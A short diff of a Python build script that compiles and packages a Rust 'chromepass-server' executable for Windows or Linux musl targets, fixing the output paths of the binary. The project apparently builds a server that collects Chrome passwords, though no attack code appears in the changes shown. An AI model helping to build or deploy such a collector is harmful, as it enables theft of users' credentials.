@@ -113,10 +113,10 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
         nightly = f"{refresh_env}rustup default nightly"
         musl_target = f"{refresh_env}rustup target add x86_64-unknown-linux-musl"
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server};{nightly};{musl_target};cargo build --release --target x86_64-unknown-linux-musl"
-        executable_name = "chromepass-server"
+        executable_name = "x86_64-unknown-linux-musl/release/chromepass-server"
     else:
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
-        executable_name = "chromepass-server.exe"
+        executable_name = "release/chromepass-server.exe"
     if os.path.exists(temp_path) and not nobuild:
         print("[+] Building Server")
         if not linux:
@@ -124,9 +124,9 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
                             f"{template_dir}/{chromepass_server}/server.ico")
         if compile_client(build_command):
             shutil.copyfile(
-                f"{template_dir}/{chromepass_server}/target/release/{executable_name}", f"{dist_dir}/{filename}.exe")
+                f"{template_dir}/{chromepass_server}/target/{executable_name}", f"{dist_dir}/{filename}.exe")
             os.remove(
-                f"{template_dir}/{chromepass_server}/target/release/{executable_name}")
+                f"{template_dir}/{chromepass_server}/target/{executable_name}")
             print("[+] Server build successful")
             return True
     else:
